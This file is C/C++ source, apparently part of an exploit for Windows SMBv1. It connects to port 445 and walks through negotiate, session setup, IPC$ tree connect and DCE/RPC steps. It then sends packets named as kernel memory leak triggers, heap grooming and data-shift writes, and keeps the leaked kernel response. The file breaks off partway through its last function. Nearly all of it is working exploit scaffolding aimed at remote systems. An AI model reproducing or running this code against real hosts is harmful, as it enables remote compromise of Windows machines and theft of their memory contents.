#include "smb.h"

#pragma warning(push)
#pragma warning(disable : 6387)
//#pragma warning(disable : )

/*
unsigned int TargetConnect(SOCKET& s, sockaddr_in& sa, WSAData& wsa, const char* targetip, unsigned int& status)
{
	typedef unsigned long(__stdcall* PFN_INET_ADDR)(const char* ip);
	s = NULL;
	sa = { 0 };
	wsa = { 0 };
	status = 0;
	HMODULE wsockdll = NULL;
	PFN_INET_ADDR pinet_addr = NULL;

	status = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (status != 0)
		return MAKEUNSIGNED(WSAGetLastError());

	if (notnull(GetModuleHandleW(TEXT("ws2_32"))))
	{
		wsockdll = GetModuleHandleW(TEXT("ws2_32"));
	}
	else
	{
		wsockdll = LoadLibraryW(TEXT("ws2_32.dll"));
	}

	if (isnull(wsockdll))
		return STATUS_INVALID_HANDLE;
	else
		pinet_addr = (PFN_INET_ADDR)GetProcAddress(wsockdll, "inet_addr");

	if (isnull(pinet_addr))
		ExitProcess(STATUS_INVALID_HANDLE);
	else
		sa.sin_addr.s_addr = pinet_addr(targetip);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(445);

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (validsock(s))
	{
		status = connect(s, (sockaddr*)&sa, sizeof(sa));
		if (issockerr(status))
		{
#ifdef _DEBUG
			fwprintf_s(stderr, TEXT("[%ws]:\t error 0x%08x occured when calling \"%ws\"\n"), __FUNCTIONW__, STATUS_FAIL, L"connect()");
			(VOID)SleepEx(2000, FALSE);
			ExitProcess(STATUS_FAIL);
#else
			return MAKEUNSIGNED(STATUS_FAIL);
#endif	//_DEBUG
		}
		else
		{
			*(&status) &= 0;
			status = 0;
			return 0;
		}

	}
	else
	{
		return MAKEUNSIGNED(WSAGetLastError());
	}

	return STATUS_FAIL;

}

unsigned int SendData(BUFFER IN OUT* bws, SOCKET& s, unsigned int& status)
{
	status = 0;

	if (badsock(s))
		return MAKEUNSIGNED(WSAGetLastError());

	*(int*)(&status) = send(s, (const char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
	return status;
}

unsigned int RecvData(BUFFER IN OUT* bws, DWORD IN bufsize, SOCKET& s, unsigned int& status)
{
	bwsalloc(bws, bufsize);

	if (badsock(s))
		return MAKEUNSIGNED(WSAGetLastError());

	*(int*)(&status) = recv(s, (char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
	return status;
}
*/

BOOLEAN SendRecvNegotiate(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	unsigned int sendstatus = 0, & recievestatus = sendstatus;
	BUFFER* srv = (&outbound->ThisPacket), * client = (&inbound->ThisPacket), tmp = { 0 };

	//attempt to make nego request packet fail if it fails
	if (isnull(negotiate_request_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		errmsg(__FUNCSIG__, __LINE__, STATUS_NO_MEMORY);
		return FALSE;
	}

	// exit loop if socket is invalid
	while (validsock(s))
	{
		//send request
		PutUlong(&sendstatus, SendData(srv, s, sendstatus));

		outbound->ThisSmb = MAKEPSMB(srv->pbdata + 4);
		outbound->ThisNetbiosSize = srv->pbdata + sizeof(WORD);

		if (issockerr(sendstatus) || badsock(s) || ((sendstatus & STATUS_FAIL) == STATUS_FAIL))
		{
			sendstatus = STATUS_FAIL;
			break;
		}

		//recv response
		PutUlong(&recievestatus, RecvData(client, 0x200, s, recievestatus));

		bwsalloc(&tmp, recievestatus);
		cpy(tmp.pbdata, inbound->ThisPacket.pbdata, tmp.dwsize);
		bwsfree(&inbound->ThisPacket);
		bwsalloc(&inbound->ThisPacket, tmp.dwsize);
		cpy(inbound->ThisPacket.pbdata, tmp.pbdata, inbound->ThisPacket.dwsize);
		bwsfree(&tmp);

		inbound->ThisSmb = MAKEPSMB(srv->pbdata + 4);
		inbound->ThisNetbiosSize = srv->pbdata + 2;
		outbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
		outbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;

		if (issockerr(recievestatus))
		{
			sendstatus = STATUS_FAIL;
			break;
		}
		else
		{
			return TRUE;
		}
	}

	if (sendstatus == STATUS_FAIL)
	{
		goto cleanup;
	}



cleanup:
	if (validsock(s))
		closesocket(s);
	s = INVALID_SOCKET;
	WSACleanup();
	if (notnull(client->pbdata))
		bwsfree(client);
	if (notnull(srv->pbdata))
		bwsfree(srv);
	return FALSE;
}

BOOLEAN SendRecvSessionSetupAndx(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	unsigned int sendstatus[2] = { 0 }, & recievestatus = *sendstatus;
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	BOOLEAN retval = 0;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		//errmsg(__FUNCTION__, __LINE__, GetLastError());
		return FALSE;
	}

	if (badsock(s))
		return FALSE;

	if (isnull(session_setup_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		errmsg(__FUNCSIG__, __LINE__, STATUS_NO_MEMORY);
		return FALSE;
	}

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (!GetUlong(sendstatus) || issockerr(GetUlong(sendstatus)))
		return FALSE;

	PutUnsigned(&recievestatus, RecvData(client, 0x200, s, GetUnsigned(sendstatus + 1)));

	if (!GetUlong(&recievestatus) || issockerr(GetUlong(&recievestatus)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(&recievestatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
	inbound->ThisNetbiosSize = MAKEPBYTE(client->pbdata + NETBIOS_SIZE_OFFSET);
	outbound->ThisNetbiosSize = MAKEPBYTE(srv->pbdata + NETBIOS_SIZE_OFFSET);

	return TRUE;
}

BOOLEAN SendRecvTreeConnectAndx(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info, PCWSTR IN ip)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	static UNICODE_STRING wstring, unc; static PWSTR unicodeiptmp;
	WCHAR psztmp[0x100] = { 0 };
	static DWORD i;
	BYTE iparray[4] = { 0 };

	unicodeiptmp = MAKEPWSTR(psztmp);

	wsprintfW(unicodeiptmp, L"\\\\%ws\\IPC$", ip);
	InitUnicodeString(unicodeiptmp, &unc);


	if (isnull(tree_connect_packet(srv, &unc, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		FreeUnicodeString(&unc);
		return FALSE;
	}



	PutUlong(sendsize, SendData(srv, s, sendsize[1]));

	PutUlong(recvsize, RecvData(client, 0x300, s, recvsize[1]));

	if (!cmp(srv->pbdata + 4, "\xFFSMB", 4))
		return FALSE;
	if (!cmp(client->pbdata + 4, "\xFFSMB", 4))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);
	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = MAKEPBYTE(inbound->ThisPacket.pbdata + sizeof(WORD));
	outbound->ThisNetbiosSize = MAKEPBYTE(outbound->ThisPacket.pbdata + sizeof(WORD));
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + 4);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + 4);

	if (inbound->ThisSmb->Status.NtStatus & STATUS_FAIL)
		return FALSE;
	else
		return TRUE;
}

BOOLEAN SendRecvNtCreateAndx(RequestPacketLinkedList* OUT outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* IN info)
{
#pragma warning(push)
#pragma warning(disable : 28182)
	BUFFER* client = &inbound->ThisPacket, * srv = &outbound->ThisPacket, tmp = { 0 };
	unsigned int sendstatus = 0, recvstatus = 0;

	if (badsock(s) || isnull(info))
		return FALSE;

	if (isnull(nt_create_andx_packet(srv, byteswap16(0), get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUlong(&sendstatus, SendData(srv, s, sendstatus));

	if (sendstatus == 0 || issockerr(sendstatus))
		return FALSE;

	PutUlong(&recvstatus, RecvData(client, 0x200, s, recvstatus));

	if (recvstatus == 0 || issockerr(recvstatus))
		return FALSE;

	if (notnull(inbound->ThisPacket.pbdata))
	{
		inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + 4);
		if (inbound->ThisSmb->Status.NtStatus == 0)
		{
			PRESP_NT_CREATE_ANDX presp = (PRESP_NT_CREATE_ANDX)(inbound->ThisPacket.pbdata + 36);
			set_fid(info, presp->Fid);
		}
		else
		{
			set_fid(info, 0);
		}
	}

	bwsalloc(&tmp, GetUlong(&recvstatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);


	inbound->ThisNetbiosSize = inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	if (!cmp(client->pbdata + 4, "\xFFSMB", 4))
		return FALSE;

	if (inbound->ThisSmb->Status.NtStatus & STATUS_FAIL)
	{
		SetLastError(GetUlong(&inbound->ThisSmb->Status.NtStatus));
		return FALSE;
	}
#pragma warning(pop)
	return TRUE;
}

BOOLEAN SendRecvTransDcerpcBind(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };

	if (badsock(s))
		return FALSE;

	if (isnull(trans_dcerpc_bind_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUlong(sendsize, SendData(srv, s, sendsize[1]));

	if (badsock(s) || issockerr(GetUlong(sendsize)))
		return FALSE;

	if (!sendsize[0])
	{
		bwsfree(srv);
		return FALSE;
	}

	PutUlong(recvsize, RecvData(client, 0x400, s, recvsize[1]));

	if ((*recvsize) == 0)
	{
		bwsfree(srv);
		bwsfree(client);
		return FALSE;
	}

	if (!cmp(client->pbdata + SMB_HEADER_OFFSET, "\xFFSMB", 4))
	{
		bwsfree(srv);
		bwsfree(client);
		return FALSE;
	}

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);
	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = (inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	outbound->ThisNetbiosSize = (outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	return TRUE;
}

BOOLEAN SendRecvLsaGetUsername(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };

	if (badsock(s))
		return FALSE;

	if (isnull(write_andx_lsarpc_getusername_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUlong(sendsize, SendData(srv, s, sendsize[1]));

	if (badsock(s) || issockerr(GetUlong(sendsize)))
		return FALSE;

	if (!sendsize[0])
	{
		bwsfree(srv);
		return FALSE;
	}

	PutUlong(recvsize, RecvData(client, 0x400, s, recvsize[1]));

	if ((*recvsize) == 0)
	{
		bwsfree(srv);
		bwsfree(client);
		return FALSE;
	}

	if (!cmp(client->pbdata + SMB_HEADER_OFFSET, "\xFFSMB", 4))
	{
		bwsfree(srv);
		bwsfree(client);
		return FALSE;
	}

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	inbound->ThisNetbiosSize = inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;

	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisNetbiosSize = outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;




	return TRUE;
}

BOOLEAN SendRecvTransFirstLeakTrigger(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info IN* info)
{
	static unsigned int sendsize[2], recvsize[2], * sstatus, * rstatus;

	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 }, * leakdata = &leak->KrnlLeakResponse;

	if (badsock(s))
		return FALSE;

	if (isnull(outbound) || isnull(inbound) || isnull(leak) || isnull(info))
	{
		errmsg(__FUNCSIG__, __LINE__, STATUS_INVALID_PARAMETER);
		SetLastError(STATUS_INVALID_PARAMETER | STATUS_FAIL);
		return FALSE;
	}

	if (isnull(trans_trigger_first_leak_packet(srv, 10252, get_uid(info), get_mid(info), get_tid(info))))
	{
		SetLastError(STATUS_NO_MEMORY | STATUS_FAIL);
		return FALSE;
	}

	sstatus = sendsize;
	rstatus = recvsize;

	PutUnsigned(sstatus, SendData(srv, s, GetUnsigned(sendsize + 1)));

	PutUnsigned(rstatus, RecvData(client, 0x100, s, GetUnsigned(recvsize + 1)));

	if (isnull(*rstatus) || issockerr(*rstatus))
	{
		PutUlong(sstatus, WSAGetLastError());
		bwsfree(srv);
		bwsfree(client);
		SetLastError(GetUlong(sstatus));
		return FALSE;
	}

	if (!cmp(client->pbdata + SMB_HEADER_OFFSET, "\xFFSMB", 4))
		return FALSE;

	bwsalloc(&tmp, GetUlong(rstatus));
	cpy(tmp.pbdata, inbound->ThisPacket.pbdata, tmp.dwsize);
	bwsfree(&inbound->ThisPacket);
	bwsalloc(&inbound->ThisPacket, tmp.dwsize);
	cpy(inbound->ThisPacket.pbdata, tmp.pbdata, inbound->ThisPacket.dwsize);
	bwsfree(&tmp);

	return TRUE;
}

BOOLEAN SendRecvTransGroomTypeOne(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info)
{
	static unsigned int sendsize[2], recvsize[2], * sstatus, * rstatus;
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };

	if (badsock(s))
		return FALSE;
	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	sstatus = sendsize;
	rstatus = recvsize;

	if (isnull(trans_groom_type_one_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	*sstatus = SendData(srv, s, GetUnsigned(sendsize + 1));

	*rstatus = RecvData(client, 0x100, s, GetUnsigned(recvsize + 1));

	if (isnull(*rstatus) || issockerr(*rstatus))
	{
		*sstatus = WSAGetLastError();
		SetLastError(GetUlong(sstatus));
		bwsfree(client);
		bwsfree(srv);
		return FALSE;
	}

	bwsalloc(&tmp, GetUlong(rstatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);
	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	return TRUE;
}

BOOLEAN SendRecvTransFirstMultiRequestTypeOne(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info)
{
	static unsigned int sendsize[2], recvsize[2], * sstatus, * rstatus;
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	WORD mids[] = { 75, byteswap16(64), 76 };
	if (badsock(s))
		return FALSE;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		return FALSE;
	}

	sstatus = sendsize;
	rstatus = recvsize;

	if (isnull(trans_multirequest_type_one_packet(srv, get_pid(info), get_uid(info), mids, get_tid(info))))
	{
		errmsg(__FUNCSIG__, __LINE__, STATUS_FAIL | GetLastError());
		return FALSE;
	}


	PutUnsigned(sstatus, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sstatus) || issockerr(GetUlong(sstatus)))
	{
		*sstatus = WSAGetLastError();
		SetLastError(GetUlong(sstatus));
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		bwsfree(srv);
		return FALSE;
	}

	PutUnsigned(rstatus, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(rstatus) || issockerr(GetUlong(rstatus)))
	{
		*sstatus = WSAGetLastError();
		SetLastError(GetUlong(sstatus));
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	bwsalloc(&tmp, GetUlong(rstatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTransSecondMultiRequestTypeOne(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info)
{
	unsigned int sstatus[2] = { 0 }, rstatus[2] = { 0 };
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };

	if (isnull(outbound) || isnull(inbound) || isnull(info))
	{
		PutUlong(sstatus + 1, STATUS_INVALID_PARAMETER);
		SetLastError(GetUlong(sstatus + 1));
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	if (badsock(s))
	{
		PutUlong(sstatus, SOCKET_ERROR);
		SetLastError(GetUlong(sstatus));
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	if (isnull(trans_multirequest_type_one_number_two_packet(srv, get_pid(info), get_uid(info), NULL, get_tid(info))))
	{
		errmsg(__FUNCSIG__, __LINE__, STATUS_FAIL);
		return FALSE;
	}

	PutUnsigned(sstatus, SendData(srv, s, GetUnsigned(sstatus + 1)));

	if (isnull(*sstatus) || issockerr(*sstatus))
	{
		errmsg(__FUNCSIG__, __LINE__, WSAGetLastError());
		return FALSE;
	}

	PutUnsigned(rstatus, RecvData(client, 0x200, s, GetUnsigned(rstatus + 1)));

	if (isnull(*rstatus) || issockerr(*rstatus))
	{
		errmsg(__FUNCSIG__, __LINE__, WSAGetLastError());
		return FALSE;
	}

	bwsalloc(&tmp, GetUlong(rstatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTransThirdMultiRequestTypeOne(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info)
{
	static unsigned int sendstatus[2], recvstatus[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans_multirequest_type_one_number_three_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (issockerr(GetUlong(sendstatus)) || !GetUlong(sendstatus))
		return FALSE;

	PutUnsigned(recvstatus, RecvData(client, 0x400, s, GetUnsigned(recvstatus + 1)));

	if (issockerr(GetUlong(recvstatus)) || !GetUlong(recvstatus))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvstatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTransGroomTypeTwo(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info IN* info)
{
	unsigned sendsize[2] = { 0 }, recvsize[2] = { 0 }, * rstatus = recvsize, * sstatus = sendsize;
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };

	if (isnull(outbound) || isnull(inbound) || isnull(info))
	{
		PutUlong(sstatus + 1, STATUS_INVALID_PARAMETER);
		SetLastError(GetUlong(sstatus + 1));
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	if (badsock(s))
	{
		PutUlong(sstatus, SOCKET_ERROR);
		SetLastError(GetUlong(sstatus));
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	if (isnull(trans_groom_type_two_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		SetLastError(STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	PutUlong(sstatus, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (isnull(GetUlong(sstatus)) || issockerr(GetUlong(sstatus)))
	{
		PutUnsigned(sendsize + 1, WSAGetLastError());
		SetLastError(GetUlong(sendsize + 1));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(sendsize + 1));
		return FALSE;
	}

	PutUlong(rstatus, RecvData(client, 0x400, s, GetUnsigned(rstatus + 1)));

	if (isnull(GetUlong(rstatus)) || issockerr(GetUlong(rstatus)))
	{
		PutUnsigned(recvsize + 1, WSAGetLastError());
		SetLastError(GetUlong(recvsize + 1));
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	bwsalloc(&tmp, GetUlong(rstatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	if (!cmp(client->pbdata + SMB_HEADER_OFFSET, "\xFFSMB", 4))
		return FALSE;
	else
		return TRUE;
}

BOOLEAN SendRecvTransSecondarySecondLeakTrigger(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info IN* info)
{
	static unsigned int sendsize[2], recvsize[2], * sstatus, * rstatus;
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, * leakbws = &leak->KrnlLeakResponse, tmp = { 0 };
	static WORD pid, mid;
	PRESP_TRANSACTION transresp = NULL;

	PutUshort(&pid, 10252);
	PutUshort(&mid, 75);
	//	mid = ((get_mid(info) == 75) ? get_mid(info) : get_special_mid(info));

	if (isnull(outbound) || isnull(inbound) || isnull(info) || isnull(leak))
	{
		PutUlong(sstatus + 1, STATUS_INVALID_PARAMETER);
		SetLastError(GetUlong(sstatus + 1));
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	if (badsock(s))
	{
		PutUlong(sstatus, SOCKET_ERROR);
		SetLastError(GetUlong(sstatus));
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	rstatus = recvsize;
	sstatus = sendsize;

	if (isnull(trans_secondary_trigger_second_leak_packet(srv, pid, get_uid(info), mid, get_tid(info))))
	{
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	PutUnsigned(sstatus, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sstatus) || issockerr(GetUlong(sstatus)))
		return FALSE;

	PutUnsigned(rstatus, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(rstatus) || issockerr(GetUlong(rstatus)))
		return FALSE;

	if (!cmp(client->pbdata + SMB_HEADER_OFFSET, "\xFFSMB", 4))
		return FALSE;

	bwsalloc(&tmp, GetUlong(rstatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	bwsalloc(leakbws, client->dwsize);
	cpy(leakbws->pbdata, client->pbdata, leakbws->dwsize);

	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	leak->ResponseHeader = MAKEPSMB(leak->KrnlLeakResponse.pbdata + SMB_HEADER_OFFSET);

	inbound->ThisNetbiosSize = inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	leak->ResponseNetbios = MAKEPDWORD(leak->KrnlLeakResponse.pbdata);

	transresp = (PRESP_TRANSACTION)(leakbws->pbdata + SMB_PARAM_OFFSET);

	leak->ResponseParameters = (MAKEPBYTE(leak->ResponseHeader) + transresp->ParameterOffset);
	leak->ResponseData = (MAKEPBYTE(leak->ResponseHeader) + transresp->DataOffset);

	return((cmp(leak->KrnlLeakResponse.pbdata + SMB_HEADER_OFFSET, "\xFFSMB", 4) == TRUE) ? TRUE : FALSE);
}

BOOLEAN SendRecvWriteAndxIndataShift(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	unsigned int sendsize[2] = { 0 }, recvsize[2] = { 0 };
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (get_fid(info) != 0x4000)
		set_fid(info, 0x4000);

	if (isnull(write_andx_shift_indata_packet(srv, 10251, get_uid(info), get_special_mid(info), get_tid(info), get_fid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	inbound->ThisNetbiosSize = (inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	outbound->ThisNetbiosSize = (outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
	{
